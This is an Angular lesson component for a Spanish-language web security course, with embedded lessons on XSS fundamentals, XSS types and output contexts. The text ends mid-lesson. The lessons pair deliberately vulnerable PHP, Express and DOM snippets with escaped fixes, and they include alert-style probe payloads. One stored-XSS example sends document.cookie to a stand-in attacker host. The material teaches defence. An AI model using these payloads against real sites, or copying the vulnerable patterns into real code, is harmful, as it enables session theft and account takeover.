import { Component, OnInit } from '@angular/core';
import { CommonModule } from '@angular/common';
import { ActivatedRoute, Router } from '@angular/router';
import { FontAwesomeModule } from '@fortawesome/angular-fontawesome';
import { faCheckCircle } from '@fortawesome/free-solid-svg-icons';
import hljs from 'highlight.js';
import { LessonProgressService } from '../../../../services/lesson-progress.service';


interface LessonData {
  id: string;
  title: string;
  description: string;
  htmlContent: string;
  category: string;
}

@Component({
  selector: 'app-lesson',
  standalone: true,
  imports: [CommonModule, FontAwesomeModule],
  templateUrl: './lesson.html',
  styleUrl: './lesson.scss'
})

export class LessonComponent implements OnInit {
  faCheckCircle = faCheckCircle;
  lessonData: LessonData = {
    id: '',
    title: '',
    description: '',
    htmlContent: '',
    category: ''
  };
  
  currentStep = 1;
  totalSteps = 1;
  hasPreviousLesson = false;
  hasNextLesson = true;
  isLessonCompleted = false;
  isMarkingComplete = false;
  
  // Track section completion buttons
  sectionButtons: NodeListOf<Element> | null = null;
  completedSections: Set<number> = new Set();
  totalSections = 0;

  private categoryLessons = {
    'security-basics': ['intro-seguridad', 'owasp-top-10'],
    'xss': ['fundamentos-xss', 'tipos-xss', 'contextos-salida-xss', 'dom-xss-ejecucion-cliente', 'prevencion-xss', 'csp-y-headers', 'diseno-seguro-y-procesos', 'casos-avanzados-xss'],
    'sqli': ['fundamentos-sqli', 'tipos-sqli', 'fundamentos-sql-y-acceso', 'raices-sqli', 'prevencion-sqli', 'arquitectura-operaciones', 'analisis-priorizacion-riesgo', 'casos-avanzados-sqli']
  };

  private lessonContent: { [key: string]: LessonData } = {
    'fundamentos-xss': {
      id: 'fundamentos-xss',
      title: 'Fundamentos de XSS',
      description: 'Aprende qué es Cross-Site Scripting, cómo funciona y por qué sigue siendo una de las vulnerabilidades más comunes en aplicaciones web modernas.',
      category: 'xss',
      htmlContent: `
        <h2>Introducción</h2>
        <p>
          Cross-Site Scripting (XSS) o <b> secuencias de comandos en sitios cruzados</b>, es una vulnerabilidad en aplicaciones web que permite a los atacantes inyectar código JavaScript malicioso en páginas visitadas por otros usuarios, comprometiendo su seguridad. Este tipo de ataques puede utilizarse para robar credenciales, secuestrar sesiones, redirigir usuarios a sitios maliciosos o manipular la funcionalidad de una aplicación web.
        </p>

        <p>
          En general, XSS ocurre cuando una aplicación inserta datos proporcionados por un usuario en la salida HTML sin validarlos ni codificarlos de forma adecuada. El navegador del usuario no puede distinguir si ese código proviene del sitio confiable o de un atacante, por lo que termina ejecutándolo con los mismos privilegios del sitio legítimo. Esto abre la puerta a numerosas consecuencias maliciosas.
        </p>
        <h2>¿Por qué es peligrosa esta vulnerabilidad?</h2>
        <p>
           Porque el script inyectado se ejecuta como si fuera parte del sitio de confianza. En un ataque exitoso de XSS, el código del atacante puede hacer todo lo que podría hacer el código legítimo de la aplicación en el navegador de la víctima. Por ejemplo, un exploit XSS podría robar cookies de sesión del usuario (lo que permite secuestrar su cuenta), mostrar phishing engañoso, redirigir al usuario a otro sitio malicioso o incluso modificar visualmente el contenido de la página. Las posibilidades van desde simples molestias (como hacer aparecer ventanas emergentes inesperadas) hasta comprometer por completo la cuenta o los datos del usuario afectado.
        </p>

        <h2>Explicación paso a paso del concepto</h2>
        <p>Para entender cómo ocurre un ataque XSS, consideremos el siguiente flujo básico paso a paso:</p>
        
        <ol>
          <li><strong>Inserción de datos maliciosos:</strong> El atacante encuentra un punto en la aplicación web que acepta entrada del usuario (por ejemplo, un campo de formulario, una URL con parámetros, un comentario en un foro, etc.). En lugar de un dato inocuo, el atacante ingresa código JavaScript o HTML malicioso. Esta es la carga útil (payload) del ataque.</li>
          
          <li><strong>Falta de sanitización en el servidor:</strong> El servidor web recibe esa entrada y, debido a una falla de seguridad, la incluye tal cual en la página de respuesta que genera, sin realizar la validación o codificación necesaria para neutralizar contenido activo. En otras palabras, la aplicación confía ciegamente en la entrada del usuario y la inserta en el HTML de la página dinámica.</li>
          
          <li><strong>Entrega del contenido al navegador:</strong> El navegador de la víctima carga la página web resultante desde el sitio legítimo. Esa página contiene el código del atacante incrustado dentro del HTML (por ejemplo, una etiqueta <code>&lt;script&gt;</code> maliciosa, un atributo con código JavaScript incrustado, etc.). Dado que el contenido proviene del dominio legítimo, el navegador asume que es de confianza y lo ejecuta.</li>
          
          <li><strong>Ejecución del código malicioso:</strong> El script inyectado se ejecuta en el navegador de la víctima con todos los privilegios del sitio. En este punto, el atacante puede realizar acciones como obtener datos sensibles (cookies, tokens de sesión, información personal), manipular el DOM de la página para mostrar contenido falso o engañoso, o incluso realizar peticiones en nombre del usuario (aprovechando su sesión activa). Todo ocurre sin que la víctima lo note, ya que el ataque suele ocurrir de forma silenciosa en segundo plano.</li>
          
          <li><strong>Resultado o impacto:</strong> Finalmente, el atacante logra su objetivo, que puede ser robar información del usuario, tomar control de su cuenta, propagar malware, llevar a cabo phishing dentro del sitio o cualquier otro acto malicioso. Después, el código malicioso puede incluso autodestruirse o permanecer oculto para dificultar su detección.</li>
        </ol>

        <p>
          En suma, el atacante "inyecta" un fragmento de código en la aplicación vulnerable, y esa inyección viaja desde el servidor hasta el navegador víctima, donde se ejecuta con la autoridad del sitio web comprometido. Todo esto es posible porque la aplicación no manejó correctamente la entrada no confiable. En próximos módulos profundizaremos en dónde y cómo ocurren estas inyecciones (reflejadas, almacenadas, DOM) y en las técnicas para prevenirlas.
        </p>

        <h2>Ejemplo vulnerable</h2>
        <p>
          Consideremos un ejemplo sencillo para ilustrar un XSS. Supongamos una página web que saluda al usuario por su nombre, tomando dicho nombre de los parámetros de la URL. Un código PHP vulnerable podría ser:
        </p>

        <pre><code>&lt;p&gt;Hola &lt;?php echo $_GET['nombre']; ?&gt;!&lt;/p&gt;</code></pre>

        <p>
          Aquí la página inserta directamente el valor del parámetro nombre dentro de un párrafo HTML. Si un atacante induce a la víctima a visitar la URL:
        </p>

        <pre><code>ejemplo.com/ejemplo.php?nombre=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>

        <p>el código resultante en la respuesta será:</p>

        <pre><code>&lt;p&gt;Hola &lt;script&gt;alert('XSS')&lt;/script&gt;!&lt;/p&gt;</code></pre>

        <p>
          El navegador interpretará la etiqueta <code>&lt;script&gt;</code> inyectada y ejecutará <code>alert('XSS')</code>. En un ataque real, en lugar de mostrar un simple <code>alert()</code>, el script podría robar la cookie de sesión (document.cookie) u otra acción maliciosa. Este ejemplo demuestra un XSS reflejado (que se envía en la URL y se "refleja" inmediatamente en la página).
        </p>

        <p>
          Otro escenario común es un campo de comentarios en un blog. Imagina que un formulario permite publicar comentarios y el contenido se muestra sin sanitización. Un atacante podría enviar como comentario algo como:
        </p>

        <pre><code>&lt;script&gt;window.location='http://sitio-del-attacker/steal?cookie='+document.cookie&lt;/script&gt;</code></pre>

        <p>
          Si la aplicación almacena ese comentario en la base de datos y luego lo presenta tal cual a cualquier visitante, cada usuario que vea la página ejecutará el script del atacante, enviando su cookie de sesión al servidor del atacante. Este sería un XSS almacenado (el código malicioso permanece en la aplicación hasta que es disparado). En ambos casos, la raíz del problema es la misma: la aplicación incrusta entrada del usuario en la salida sin tratarla adecuadamente.
        </p>

        <h2>Ejemplo seguro</h2>
        <p>
          Veamos ahora cómo corregir el ejemplo anterior usando codificación/escape de caracteres especiales. La clave es asegurarse de que cualquier contenido proporcionado por el usuario se trate como texto literal, no como código HTML/JS ejecutable. En PHP, se puede usar la función <code>htmlspecialchars()</code> para escapar caracteres como &lt;, &gt;, " y '. Una versión segura del fragmento sería:
        </p>

        <pre><code>&lt;p&gt;Hola &lt;?php echo htmlspecialchars($_GET['nombre'], ENT_QUOTES, 'UTF-8'); ?&gt;!&lt;/p&gt;</code></pre>

        <p>
          Ahora, si el parámetro nombre contiene <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>, la función lo convertirá a <code>&amp;lt;script&amp;gt;alert('XSS')&amp;lt;/script&amp;gt;</code>. El HTML resultante sería:
        </p>

        <pre><code>&lt;p&gt;Hola &amp;lt;script&amp;gt;alert('XSS')&amp;lt;/script&amp;gt;!&lt;/p&gt;</code></pre>

        <p>
          El navegador mostrará literalmente <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> en la página, en lugar de ejecutarlo, ya que los caracteres <code>&lt;</code> y <code>&gt;</code> han sido reemplazados por sus entidades HTML seguras (<code>&amp;lt;</code> y <code>&amp;gt;</code>).
        </p>

        <h2>Errores comunes</h2>
        <p>Al iniciar en seguridad web, es frecuente cometer algunas imprudencias o suposiciones incorrectas que conducen a vulnerabilidades XSS. Estos son algunos errores comunes:</p>

        <ul>
          <li><strong>Confiar en la entrada del usuario:</strong> Asumir que los usuarios (o los parámetros en URLs) solo enviarán datos benignos. Subestimar la creatividad de los atacantes es peligroso; cualquier campo, por inofensivo que parezca (nombre, mensaje, id, etc.), puede ser vehículo de código malicioso si no se maneja correctamente.</li>

          <li><strong>Filtrado insuficiente o incorrecto:</strong> Intentar "sanear" la entrada usando listas negras de palabras o etiquetas (por ejemplo, bloqueando la palabra <code>&lt;script&gt;</code> y nada más). Este enfoque es frágil y fácil de evadir, un atacante puede usar otras etiquetas (ej. <code>&lt;img onerror="..."&gt;</code>), codificaciones alternativas o incluso casos de mayúsculas/minúsculas para escapar del filtro.</li>

          <li><strong>No escapar la salida según el contexto:</strong> Un error crítico es olvidar codificar/escapar los caracteres especiales al insertar datos dinámicos en HTML. Cada contexto (HTML, atributo, JavaScript, etc.) requiere un tipo de escape distinto.</li>
          
          <li><strong>Creer que ciertas circunstancias "eliminan" el riesgo:</strong> Por ejemplo, suponer que si un formulario usa método POST en lugar de GET, entonces no es vulnerable a XSS. En realidad, un atacante puede explotar XSS también mediante solicitudes POST.</li>
          
          <li><strong>Ignorar fuentes menos obvias de entrada:</strong> A veces se piensa que solo los campos de formulario o parámetros URL son entrada de usuario. Pero también lo son las cookies, el contenido de cargas de archivos, los valores almacenados en bases de datos provenientes de usuarios, e incluso datos de terceros.</li>
        </ul>

        <h2>Buenas prácticas</h2>
        <p>Para sentar unos fundamentos sólidos, resumamos algunas buenas prácticas iniciales para evitar XSS:</p>

        <ul>
          <li><strong>Asume que toda entrada es maliciosa hasta probar lo contrario:</strong> Adopta siempre una postura defensiva con los datos del usuario. Desde el diseño mismo de la aplicación, identifica qué entradas provienen de usuarios o fuentes no confiables y planifica cómo validarlas/limpiarlas.</li>
          
          <li><strong>Valida la entrada (Entrada confiable):</strong> Define reglas claras de validación para los datos que esperas. Rechaza o sanitiza cualquier cosa que no cumpla con el formato esperado. Esto por sí solo no detiene XSS en todos los casos, pero reduce la superficie de ataque.</li>
          
          <li><strong>Escapa/Codifica la salida (Salida segura):</strong> Esta es la medida más efectiva. Cada vez que muestres información que originalmente proviene de un usuario, aplícale codificación según el contexto donde irá (HTML, atributo, JavaScript, CSS, URL).</li>
          
          <li><strong>Utiliza las herramientas del lenguaje/framework:</strong> No reinventes la rueda. Usa funciones o librerías ya probadas para sanitización. Para casos donde necesites permitir cierto HTML, emplea librerías de sanitización que eliminen etiquetas/atributos peligrosos.</li>
          
          <li><strong>Mantente informado y aplica parches:</strong> Muchas vulnerabilidades XSS provienen de componentes o bibliotecas de terceros. Mantén tu stack actualizado y atento a boletines de seguridad.</li>
        </ul>

        <h2>Resumen</h2>
        <p>
          En este módulo vimos que Cross-Site Scripting es una vulnerabilidad que aprovecha la falta de manejo adecuado de entradas de usuario para inyectar scripts maliciosos en páginas web legítimas. XSS permite a atacantes ejecutar código en el navegador de las víctimas, con el potencial de comprometer cuentas, robar información sensible y alterar la funcionalidad del sitio.
        </p>
        
        <p>
          La raíz del problema es insertar datos no confiables en la salida HTML sin la debida validación/escape. Presentamos ejemplos de cómo ocurre un XSS y cómo se puede mitigar mediante el escape correcto de caracteres. También enumeramos errores comunes y enfatizamos buenas prácticas iniciales: validar entradas, escapar salidas y estar siempre vigilantes.
        </p>
      `
    },
    'tipos-xss': {
      id: 'tipos-xss',
      title: 'Tipos de XSS',
      description: 'Explora los tres tipos principales de XSS: reflejado, almacenado y basado en DOM, comprendiendo cómo se manifiestan y qué los diferencia.',
      category: 'xss',
      htmlContent: `
        <h2>Introducción</h2>
        <p>
          No todos los ataques XSS ocurren de la misma forma. Existen tres variantes principales de XSS reconocidas comúnmente, determinadas por la manera en que el código malicioso ingresa y se distribuye a las víctimas:
        </p>
        
        <ol>
          <li><strong>XSS Reflejado (No persistente):</strong> el código malicioso viaja "reflejado" en la respuesta inmediata del servidor, normalmente a través de parámetros en una URL o formulario.</li>
          <li><strong>XSS Almacenado (Persistente):</strong> el código malicioso se almacena en el servidor (por ejemplo, en una base de datos) y luego se sirve a múltiples usuarios, persistiendo en la aplicación.</li>
          <li><strong>XSS basado en DOM:</strong> la vulnerabilidad reside completamente en el lado del cliente; el código malicioso se inyecta y ejecuta manipulando el DOM en el navegador, sin necesidad de respuesta del servidor con el script incrustado.</li>
        </ol>

        <p>
          Cada tipo tiene escenarios de ataque y consideraciones ligeramente distintas. A continuación, describiremos cada uno en detalle, con ejemplos de cómo se explotan y cómo identificarlos.
        </p>

        <h2>XSS Reflejado (Reflected XSS)</h2>
        <p>
          El XSS reflejado ocurre cuando la aplicación refleja inmediatamente la entrada proporcionada por el atacante en la respuesta HTTP. Suele darse en páginas que muestran contenido dinámico basado en parámetros de la petición (por ejemplo, resultados de búsqueda, mensajes de error, etc.). El atacante envía a la víctima un enlace especialmente formulado o la induce a enviar un formulario con datos maliciosos, de modo que cuando la víctima carga esa URL, el servidor incluye el payload en la página y se ejecuta en su navegador.
        </p>

        <p>Para ilustrarlo, imaginemos un sitio con una página de búsqueda cuya URL es:</p>
        <pre><code>https://victima.com/buscar?query=algo</code></pre>

        <p>y el resultado muestra: "Búsqueda: algo". Si el sitio es vulnerable, un atacante podría crear un enlace así:</p>
        <pre><code>https://victima.com/buscar?query=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>

        <p>
          Cuando la víctima hace clic, el servidor inserta <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> en la página de resultados sin sanitizar, provocando la ejecución del alert. El ataque es "reflejado" porque el script viaja hasta el servidor y de vuelta en la misma solicitud/respuesta. Estos ataques generalmente requieren ingeniería social: el atacante necesita engañar al usuario para que haga clic en un enlace malicioso o visite una URL tramposa (por ejemplo, mediante un correo electrónico, mensaje o un link en otro sitio).
        </p>

        <h3>Ejemplo vulnerable (Reflejado)</h3>
        <p>Supongamos un código simplificado en Node.js/Express:</p>

        <pre><code class="language-javascript highlight-vulnerable">// Vulnerable: refleja directamente el parámetro 'nombre' en la respuesta HTML
app.get('/saludo', (req, res) => {
    const nombre = req.query.nombre;
    res.send(\`&lt;h1&gt;Hola \${nombre}!&lt;/h1&gt;\`);
});</code></pre>

        <p>
          Si un usuario ingenuo ingresa su nombre, la página funciona correctamente. Pero un atacante puede enviar <code>nombre=&lt;script&gt;robaCookie()&lt;/script&gt;</code> en la URL. El servidor incorporará ese string en el HTML y el navegador de la víctima ejecutará <code>robaCookie()</code> (una función definida por el atacante para exfiltrar datos, por ejemplo).
        </p>

        <h3>Ejemplo seguro</h3>
        <p>La solución es escapar el parámetro antes de incluirlo. Podríamos utilizar una función de escape:</p>

        <pre><code class="language-javascript highlight-secure">const escapeHTML = str => str
  .replace(/&/g, "&amp;")
  .replace(/</g, "&lt;")
  .replace(/>/g, "&gt;")
  .replace(/"/g, "&quot;")
  .replace(/'/g, "&#x27;");

app.get('/saludo', (req, res) => {
    const nombre = req.query.nombre;
    res.send(\`&lt;h1&gt;Hola \${escapeHTML(nombre)}!&lt;/h1&gt;\`);
});</code></pre>

        <p>
          Ahora, cualquier <code>&lt;script&gt;</code> u otra etiqueta se convertirá en texto inocuo (<code>&lt;</code> se convierte en <code>&amp;lt;</code>, etc.), evitando la ejecución de código en el navegador.
        </p>

        <h3>Detección</h3>
        <p>
          Un síntoma de XSS reflejado es que el payload debe aparecer en la propia URL o petición enviada. Si al probar manualmente colocando <code>"&lt;script&gt;alert(1)&lt;/script&gt;</code> en un parámetro vemos que aparece un alert, o inspeccionamos el HTML devuelto y allí está nuestra cadena sin escapar, la página es vulnerable. Las pruebas de penetración suelen incluir esta técnica para identificar XSS reflejados.
        </p>

        <h2>XSS Almacenado (Stored XSS)</h2>
        <p>
          En el XSS almacenado, el atacante consigue que su código malicioso se guarde permanentemente en la aplicación objetivo (por ejemplo en una base de datos, archivo de registro, sistema de comentarios, perfil de usuario, etc.). Luego, cada vez que otro usuario carga la parte del sitio que muestra ese contenido almacenado, el script malicioso se entrega y ejecuta en sus navegadores. Debido a que el payload persiste en el servidor, este tipo de XSS puede afectar a múltiples usuarios sin que cada uno tenga que hacer clic en un enlace especial.
        </p>

        <h3>Vectores comunes</h3>
        <p>
          Foros, secciones de comentarios, paneles de administración, campos de perfil (como "Nombre" o "Firma") son terreno fértil para XSS almacenado. Por ejemplo, imaginemos un foro donde los usuarios pueden publicar mensajes. Un atacante publica un mensaje que contiene <code>&lt;script&gt;...malicioso...&lt;/script&gt;</code>. Si la aplicación no limpia esa entrada al guardarla o mostrarla, todos los que vean el mensaje ejecutarán el script.
        </p>

        <p>
          Otro caso típico es una sección "Contacto" donde lo que se envía queda registrado en una interfaz de administración: el atacante envía un mensaje con código malicioso y cuando el administrador abre el panel para leerlo, su navegador ejecuta el ataque (esto se conoce a veces como XSS ciego, pues el atacante no ve directamente el resultado, pero afecta a otra víctima como un admin).
        </p>

        <h3>Ejemplo vulnerable (Almacenado)</h3>
        <p>Supongamos una aplicación con un muro de comentarios:</p>

        <pre><code class="language-javascript highlight-vulnerable">app.post('/comentarios', (req, res) => {
    const comentario = req.body.texto;
    db.save('comentarios', comentario);  // guarda el comentario tal cual
    res.redirect('/ver-comentarios');
});

app.get('/ver-comentarios', (req, res) => {
    const lista = db.getAll('comentarios');
    let html = "&lt;h2&gt;Comentarios:&lt;/h2&gt;";
    lista.forEach(c => {
        html += \`&lt;p&gt;\${c}&lt;/p&gt;\`;  // inserta cada comentario sin escape
    });
    res.send(html);
});</code></pre>

        <p>
          Si un atacante envía como comentario <code>&lt;img src=x onerror="alert('XSS')"&gt; ¡Buen sitio!</code>, el código se almacenará. Cuando otros usuarios carguen <code>/ver-comentarios</code>, el código <code>&lt;img src=x onerror="..."&gt;</code> se incrustará en la página y disparará el <code>alert('XSS')</code> en sus navegadores (o cualquier otra acción maliciosa que se definiera, como robo de cookies).
        </p>

        <p>
          Nótese que aquí no hizo falta enviar enlaces con scripts a cada usuario; el ataque "vive" en la página misma.
        </p>

        <h3>Ejemplo seguro</h3>
        <p>La mitigación implica nuevamente validar y escapar. Idealmente, sanitizar al guardar (por ejemplo, eliminar etiquetas no permitidas) y escapar al mostrar. Aplicando escape de salida en el ejemplo:</p>

        <pre><code class="language-javascript highlight-secure">// ...existing code...
lista.forEach(c => {
    html += \`&lt;p&gt;\${escapeHTML(c)}&lt;/p&gt;\`;
});
res.send(html);</code></pre>

        <p>
          Donde <code>escapeHTML</code> es similar a la función definida antes. Así, aunque un atacante guarde <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, al renderizar se convertirá en texto literal inocuo. Adicionalmente, podría implementarse una validación que rechace contenido que parezca código (por ejemplo, prohibir <code>&lt;&gt;</code> en comentarios, o utilizar una lista blanca de etiquetas permitidas como <code>&lt;b&gt;</code>, <code>&lt;i&gt;</code> si se desea formato básico).
        </p>

        <h3>Impacto y detección</h3>
        <p>
          El XSS almacenado suele ser más grave que el reflejado, ya que puede afectar a muchos usuarios y perdurar hasta ser eliminado. Un atacante podría robar las sesiones de todos los visitantes de una página comprometida, o propagar un gusano XSS (script que se auto-replica publicando más mensajes maliciosos).
        </p>

        <p>
          Para detectar este tipo de fallo, es útil probar ingresando contenido malicioso en campos que se muestren a otros usuarios y verificar si aparece sin sanitizar. Las pruebas deben incluir distintas cuentas de usuario para ver si un input se refleja en otra vista. También se recomienda revisar el código del lado servidor donde se almacenan y recuperan datos para asegurarse de que allí se aplica sanitización/escape.
        </p>

        <h2>XSS Basado en DOM (DOM-based XSS)</h2>
        <p>
          El DOM XSS ocurre enteramente en el navegador de la víctima, aprovechando APIs del Document Object Model (DOM). A diferencia de los XSS reflejados o almacenados, aquí el servidor no envía el payload malicioso incrustado en la respuesta; más bien, el propio código del sitio (JavaScript legítimo) toma datos no confiables, como la URL, el hash # en la ruta, el almacenamiento local, etc., y los inserta en la página dinámicamente de forma insegura.
        </p>

        <p>
          En otras palabras, la página original es segura cuando llega, pero luego un script del lado cliente modifica el DOM de manera vulnerable, posibilitando la inyección.
        </p>

        <p>
          Un ejemplo típico es una página que lee parte de la URL para mostrar contenido. Imagina un perfil de usuario en que la página cliente lee <code>location.hash</code> para mostrar secciones. Si alguien ingresa <code>http://sitio.com/perfil#&lt;script&gt;alert(1)&lt;/script&gt;</code>, y el código hace <code>innerHTML = location.hash</code>, terminará inyectando el script en el DOM y ejecutándolo en ese contexto. Todo esto sin interacción con el servidor tras la carga inicial.
        </p>

        <h3>Fuentes y sumideros peligrosos</h3>
        <p>En el ataque DOM XSS, el origen de datos malicioso puede ser:</p>
        <ul>
          <li>La propia URL (<code>document.location</code> o sus fragmentos)</li>
          <li>La consulta (<code>document.location.search</code>)</li>
          <li>El fragment identifier (<code>document.location.hash</code>)</li>
          <li>Las cookies (<code>document.cookie</code> si algún script las procesa)</li>
          <li><code>window.name</code></li>
          <li>Datos en <code>localStorage/sessionStorage</code></li>
          <li>Mensajes recibidos por <code>postMessage</code>, etc.</li>
        </ul>

        <p>Y los sumideros (sinks) peligrosos son las operaciones DOM que interpretan contenido HTML/JS:</p>
        <ul>
          <li><code>innerHTML</code>, <code>outerHTML</code></li>
          <li><code>document.write()</code>, <code>insertAdjacentHTML</code></li>
          <li>Asignar a <code>location</code> o <code>srcdoc</code></li>
          <li>Usar <code>eval()</code> o <code>new Function()</code> con datos externos, etc.</li>
        </ul>

        <p>
          Si el código cliente usa estas funciones sin cuidado, un atacante puede suministrar datos que las provoquen a ejecutar código arbitrario.
        </p>

        <h3>Ejemplo vulnerable (DOM XSS)</h3>
        <p>Supongamos el siguiente script en una página:</p>

        <pre><code class="language-html highlight-vulnerable">&lt;p id="mensaje"&gt;&lt;/p&gt;
&lt;script&gt;
    // Lee el parámetro \`msg\` del fragmento # de la URL e insértalo en la página
    const hash = window.location.hash;           // p.ej. "#msg=Hola"
    const params = new URLSearchParams(hash.substring(1));  // elimina '#' y parsea
    const mensaje = params.get('msg') || '¡Hola!';
    document.getElementById('mensaje').innerHTML = mensaje;
&lt;/script&gt;</code></pre>

        <p>
          Esto parece inocuo: si la URL es <code>pagina.html#msg=Bienvenido</code>, mostrará "Bienvenido". Pero un atacante puede enviarle a la víctima una URL como:
        </p>

        <pre><code>pagina.html#msg=&lt;img src=x onerror="alert('XSS')"&gt;</code></pre>

        <p>
          Cuando la víctima la abra, <code>mensaje</code> será <code>&lt;img src=x onerror="alert('XSS')"&gt;</code> y la línea <code>innerHTML</code> incrustará eso en el DOM, causando la ejecución del alert. El servidor nunca vio el script; está todo ocurriendo en el navegador. El código del desarrollador actuó como "intermediario" inseguro entre datos de la URL y el DOM.
        </p>

        <h3>Ejemplo seguro</h3>
        <p>
          La mejor práctica aquí es similar: nunca usar métodos como <code>innerHTML</code> con datos que no hayan sido limpiados. Si solo queremos insertar texto, usar <code>textContent</code> o <code>insertAdjacentText</code> en vez de <code>innerHTML</code>. Para el ejemplo:
        </p>

        <pre><code class="language-javascript highlight-secure">document.getElementById('mensaje').textContent = mensaje;</code></pre>

        <p>
          Con esto, aunque el hash contenga <code>&lt;img... onerror=...&gt;</code>, se insertará literalmente como texto visible, no ejecutable. Si realmente se necesita interpretar HTML (por ejemplo, insertar contenido enriquecido que viene de una API), se debe pasar ese HTML por un sanitizador robusto en el cliente (p.ej. DOMPurify) antes de usar <code>innerHTML</code>.
        </p>

        <h3>Frameworks modernos</h3>
        <p>
          Vale mencionar que los frameworks frontend modernos ayudan a minimizar el riesgo de DOM XSS: por ejemplo, React escapa automáticamente las variables incrustadas en JSX, Angular sanitiza contenido inseguro en bindings, Vue también escapa interpolaciones, etc. Sin embargo, todos ofrecen formas de insertar HTML bruto (por ejemplo, <code>dangerouslySetInnerHTML</code> en React, métodos del <code>DomSanitizer</code> en Angular) para casos especiales, y si el desarrollador los usa incorrectamente, puede introducir XSS a pesar de usar un framework.
        </p>

        <h3>Detección</h3>
        <p>
          Detectar DOM XSS requiere revisar el código JavaScript del lado cliente. Herramientas automatizadas como linters o escáneres pueden rastrear fuentes y sumideros peligrosos. Manualmente, se puede buscar en el código patrones como <code>innerHTML =</code>, <code>eval(</code>, <code>document.write(</code>, etc., y verificar si alguna variable influenciada por la URL u otra entrada externa llega allí sin sanear.
        </p>

        <p>
          A veces, la explotación de DOM XSS ni siquiera requiere recargar la página; basta con manipular el DOM una vez cargado (por ejemplo, a través de <code>location.hash</code> o <code>postMessage</code>). Como desarrollador, hay que tener en mente que el navegador es también un entorno de entrada no confiable y proteger en consecuencia.
        </p>

        <h2>Resumen</h2>
        <p>Hemos aprendido que XSS se presenta principalmente en tres formas:</p>

        <ul>
          <li><strong>Reflejado:</strong> el ataque viaja en cada petición y respuesta individual, típicamente vía parámetros en URLs o formularios. Es de corta vida (no persiste en el servidor) y a menudo requiere engañar al usuario para que cargue un enlace malicioso.</li>
          
          <li><strong>Almacenado:</strong> el ataque reside en la aplicación (base de datos u otro almacenamiento) y afecta a cualquier usuario que visite la parte comprometida del sitio. Suele ser el más peligroso por su alcance masivo y persistencia hasta que sea limpiado.</li>
          
          <li><strong>Basado en DOM:</strong> el ataque explota vulnerabilidades en scripts del lado cliente, sin implicar al servidor en la entrega del payload. Depende de cómo el código en el navegador maneja datos dinámicos; puede ocurrir incluso en aplicaciones que sanitizan bien en el servidor.</li>
        </ul>

        <p>
          Cada tipo requiere estrategias de detección y mitigación específicas, pero todos comparten el mismo principio subyacente: nunca confiar en datos no confiables al generar contenido web. En el próximo módulo profundizaremos en la importancia del contexto de salida, un factor crucial para aplicar correctamente las técnicas de escape y prevención según dónde se incrusta la información del usuario.
        </p>

        <p>
          Entenderemos por qué no basta con un solo "escape genérico" y cómo adaptar la defensa al lugar exacto donde podría ocurrir la inyección XSS. Así podremos construir páginas que manejen de forma segura la información dinámica en cualquier contexto.
        </p>
      `
    },
    'contextos-salida-xss': {
      id: 'contextos-salida-xss',
      title: 'Contextos de salida y su importancia',
      description: 'Descubre cómo el contexto donde se inserta la información determina el tipo de protección necesaria y aprende a reconocer los más comunes.',
      category: 'xss',
      htmlContent: `
        <h2>Introducción</h2>
        <p>
          Uno de los conceptos más críticos en la prevención de XSS es el <strong>contexto de salida</strong> (output context). Cuando hablamos de "escapar" o "codificar" la salida para prevenir XSS, nos referimos a transformar los caracteres especiales en secuencias inocuas dependiendo del lugar donde esos datos serán insertados en el documento HTML.
        </p>

        <p>
          Un error común es aplicar un escape inadecuado para el contexto, lo cual puede dejar vías de ataque abiertas. En este módulo explicaremos los distintos contextos en los que puede aparecer contenido dinámico en una página web y por qué cada uno requiere consideraciones especiales.
        </p>

        <p>En términos generales, al generar una página web hay múltiples contextos de salida que el navegador interpreta de forma distinta:</p>

        <ul>
          <li><strong>Contexto HTML</strong> (contenido de elementos HTML): texto que va entre las etiquetas de apertura y cierre de un elemento estándar (ej: <code>&lt;div&gt;...aquí...&lt;/div&gt;</code>).</li>
          <li><strong>Contexto de Atributo HTML</strong>: valor dentro de comillas (o sin comillas) de un atributo de etiqueta (ej: <code>&lt;tag atributo="...aquí..."&gt;</code>).</li>
          <li><strong>Contexto URL</strong> (en enlaces o src): valor colocado dentro de una URL, por ejemplo, en <code>href</code> de un enlace o <code>src</code> de un script/imagen.</li>
          <li><strong>Contexto JavaScript</strong>: datos insertados dentro de un bloque <code>&lt;script&gt;</code> o evento en línea, o usados en una porción de código JS.</li>
          <li><strong>Contexto CSS</strong>: datos dentro de estilos CSS, ya sea en un archivo CSS, en una etiqueta <code>&lt;style&gt;</code> interna, o en atributos de estilo en línea.</li>
        </ul>

        <p>
          Cada contexto tiene un conjunto diferente de caracteres que son significativos para el navegador. Por tanto, la manera de neutralizar una posible inyección varía. Veamos por qué esto es importante con ejemplos de problemas que surgen si no distinguimos contextos, seguido de cómo manejar cada caso de forma segura.
        </p>

        <h2>Explicación de los diferentes contextos</h2>

        <h3>1. Contexto HTML (contenido general)</h3>
        <p>
          Si insertamos texto en medio del HTML normal, debemos asegurarnos de escapar caracteres como <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, <code>"</code> y <code>'</code> para que no puedan formar etiquetas ni entidades. Por ejemplo, en un párrafo <code>&lt;p&gt;Nombre: [dato]&lt;/p&gt;</code>, si <code>[dato]</code> incluye <code>&lt;script&gt;</code>, sin escape iniciaría un script.
        </p>

        <p>
          Escapando <code>&lt;</code> como <code>&amp;lt;</code> y <code>&gt;</code> como <code>&amp;gt;</code>, lo mostrará como texto visible. Este es el contexto más básico y la mayoría de los motores de plantillas (JSP, Twig, Handlebars, etc.) escapan correctamente en este contexto por defecto.
        </p>

        <h3>2. Contexto de Atributo HTML</h3>
        <p>
          Dentro de atributos, además de <code>&lt;</code> y <code>&gt;</code>, hay que escapar comillas (<code>"</code> y <code>'</code>) y otros caracteres como <code>&amp;</code> que podrían cerrar prematuramente el valor. Un patrón de ataque aquí es inyectar algo como <code>" onmouseover="alert(1)</code> dentro de un atributo.
        </p>

        <p>
          Por ejemplo, si tenemos <code>&lt;img src="[url]"&gt;</code> y no ponemos comillas alrededor de <code>[url]</code>, un atacante podría enviar <code>javascript:alert(1)</code> o añadir espacios para salir del atributo e insertar uno nuevo.
        </p>

        <div class="warning-box">
